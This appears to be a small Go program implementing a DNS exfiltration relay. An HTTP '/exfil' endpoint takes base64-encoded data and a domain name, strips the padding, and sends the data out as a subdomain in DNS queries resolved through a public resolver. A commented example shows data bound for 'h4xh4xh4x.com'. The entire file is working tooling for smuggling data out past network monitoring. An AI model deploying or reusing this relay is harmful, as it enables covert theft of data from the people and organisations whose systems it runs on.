package main

import (
	"encoding/json"
	"fmt"
	"net/http"
	"strings"

	"github.com/miekg/dns"
	//"github.com/miekg/dns"
)

func dnsq(q string) string {
	m := new(dns.Msg)
	m.SetQuestion(dns.Fqdn(q), dns.TypeA)
	c := new(dns.Client)
	in, _, _ := c.Exchange(m, "1.1.1.1:53")
	fmt.Println(in)
	return "ok"
}

type myData struct {
	Data   string
	Domain string
}

func HelloServer(w http.ResponseWriter, r *http.Request) {
	http.ServeFile(w, r, "index.html")
	//req("U2VydmluZyBTaXplICA6IDYgCgogIEFtb3VudCAgTWVhc3VyZSAg.h4xh4xh4x.com")
}

func Exfil(w http.ResponseWriter, req *http.Request) {
	decoder := json.NewDecoder(req.Body)
	var data myData
	err := decoder.Decode(&data)
	if err != nil {
		panic(err)
	}
	d := data.Data
	d = strings.TrimRight(d, "=")
	exfildom := data.Domain
	q := d + "." + exfildom
	fmt.Println(q)
	//Stripping base64 padding
	fmt.Println(dnsq(q))
}

func main() {
	http.HandleFunc("/", HelloServer)
	http.HandleFunc("/exfil", Exfil)
	http.ListenAndServe(":8080", nil)
}
